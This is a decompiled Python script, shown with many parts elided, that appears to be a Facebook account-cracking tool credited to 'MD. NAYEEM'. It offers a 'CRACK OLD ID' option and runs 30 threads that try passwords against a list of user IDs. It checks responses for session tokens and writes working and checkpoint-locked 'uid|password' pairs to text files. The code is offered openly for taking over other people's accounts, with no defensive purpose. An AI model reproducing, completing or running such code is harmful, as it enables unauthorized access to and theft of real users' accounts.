...
# Time Succes decompile : 2022-12-13 20:17:46.033503
...
\033[1;32m══════════════════════════════════════════════════════
\033[1;32m[💜]     \033[1;32mCREATED BY\33    :  \033[1;33m MD. NAYEEM\33[0;m\033[1;32m
\033[1;32m[💜]     \033[1;32mFACEBOK      : \033[1;34m Md. Nyeem Mia
\033[1;32m[💜]     \033[1;32mGITHUB       :  \033[1;35m Nayeem2025
\033[1;32m[💜]     \033[1;32mTOOL VIRSION :  \033[1;36m1.0
...
class Main:
	def __init__(self):
		...
		os.system("clear")
		print(logo)
		print('\33[37;41m\t\t65% CP ID will just now login\33[0;m')
		print("\033[0;90m ════════════════════════════════════════════════════")
		print('\x1b[1;32m [1]\x1b[1;36m CRACK OLD ID ')
	...
	def fbtua(self):
		...
		try:
			...
			os.system('clear')
			print(logo) 
			print("\033[0;95m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=30) as coeg:
				...
				print(" \033[0;96m[+] Note: CP Open 65 % JUST NOW")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[92;1m[Nayeem] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [Nayeem-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				print('  User Agent : %s'%(ua))
				open("ok.nayeem.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[91;1m   [Nayeem-CP] %s | %s\033[94;1m        "%(uid, pw)) 
				self.ok.append("%s|%s"%(uid, pw))
				print('  User Agent :\033[1;96m %s'%(ua))
				open("cp.nayeem.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			else:
				continue
